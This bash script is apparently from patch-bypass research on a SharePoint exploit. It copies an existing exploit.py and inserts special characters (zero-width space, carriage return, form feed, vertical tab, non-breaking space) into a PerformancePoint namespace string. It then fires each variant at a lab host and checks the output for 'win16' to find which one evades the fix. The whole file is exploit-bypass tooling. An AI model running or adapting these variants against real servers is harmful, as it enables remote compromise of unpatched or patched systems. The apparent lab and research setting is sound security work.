#!/bin/bash
TARGET="http://10.10.10.166"
ORIGINAL="/mnt/d/temp/sp-toolshell-research-additional-files/3.2.diff-triage/additional_resources/exploits/exploit.py"
RESULTS="/mnt/d/temp/sp-toolshell-research-additional-files/3.2.diff-triage/ai_results"

echo "=== Testing Special Character Bypasses ==="
echo ""

# Test 11: Zero-width space (U+200B)
echo "[Test 11] Zero-width space after namespace"
cp "$ORIGINAL" "$RESULTS/test_zwsp.py"
# Note: zero-width space might not work in bash, testing regular approach
sed -i 's/Namespace="Microsoft.PerformancePoint.Scorecards"/Namespace="Microsoft.PerformancePoint.Scorecards​"/' "$RESULTS/test_zwsp.py"
python3 "$RESULTS/test_zwsp.py" --url "$TARGET" 2>&1 | grep -E "Status:|win16"
echo ""

# Test 12: Carriage return
echo "[Test 12] Carriage return in namespace"
cp "$ORIGINAL" "$RESULTS/test_cr.py"
printf '%s\n' '51c51' '< Namespace="Microsoft.PerformancePoint.Scorecards"' '---' '> Namespace="Microsoft.PerformancePoint.Scorecards\r"' | ed -s "$RESULTS/test_cr.py" 2>/dev/null || true
python3 "$RESULTS/test_cr.py" --url "$TARGET" 2>&1 | grep -E "Status:|win16"
echo ""

# Test 13: Form feed
echo "[Test 13] Form feed in namespace"
cp "$ORIGINAL" "$RESULTS/test_ff.py"
sed -i 's/Namespace="Microsoft.PerformancePoint.Scorecards"/Namespace="Microsoft.PerformancePoint.Scorecards\f"/' "$RESULTS/test_ff.py"
python3 "$RESULTS/test_ff.py" --url "$TARGET" 2>&1 | grep -E "Status:|win16"
echo ""

# Test 14: Vertical tab
echo "[Test 14] Vertical tab in namespace"
cp "$ORIGINAL" "$RESULTS/test_vtab.py"
sed -i 's/Namespace="Microsoft.PerformancePoint.Scorecards"/Namespace="Microsoft.PerformancePoint.Scorecards\v"/' "$RESULTS/test_vtab.py"
python3 "$RESULTS/test_vtab.py" --url "$TARGET" 2>&1 | grep -E "Status:|win16"
echo ""

# Test 15: Non-breaking space (U+00A0)
echo "[Test 15] Non-breaking space after namespace"
cp "$ORIGINAL" "$RESULTS/test_nbsp.py"
sed -i 's/Namespace="Microsoft.PerformancePoint.Scorecards"/Namespace="Microsoft.PerformancePoint.Scorecards "/' "$RESULTS/test_nbsp.py"
python3 "$RESULTS/test_nbsp.py" --url "$TARGET" 2>&1 | grep -E "Status:|win16"
echo ""

echo "=== Special Character Tests Complete ==="
